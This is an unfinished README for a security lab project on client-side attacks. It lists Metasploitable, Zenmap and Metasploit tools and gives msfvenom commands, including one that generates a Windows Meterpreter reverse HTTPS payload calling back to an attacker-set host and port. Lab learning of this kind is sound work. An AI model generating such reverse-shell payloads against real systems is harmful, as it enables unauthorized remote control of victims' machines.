# client-side-protection

## Objective

Finding backdoors and payloads in the client side for protection

### Skills Learned

- Installing Metasploitable on a Mac (silicon)

  

### Tools Used

- Metasploitable
- Zenmap
- metasploit
- Msfvenom
  

### Steps for Client side vulnerabilities (Msfvenom)

- We can check all the payloads that msfvenom has
```bash
msfvenom --list payloads
```
- We can see the list of the payloads, the first part is the name, the second part is the description. (Platform/type/communication) thats the naming of the payloads. The communication is broken into direction and protocol.
- We can now check a payload and check its options
  
```bash
msfvenom --payload windows/meterpreter/reverse_https --list-options
```

- We can change te basic options, LHOST is our computer and LPORT is the port we want to listen on.
  
```bash
msfvenom --payload windows/meterpreter/reverse_https LHOST=<our IP> LPORT=8080
```

- 
- 
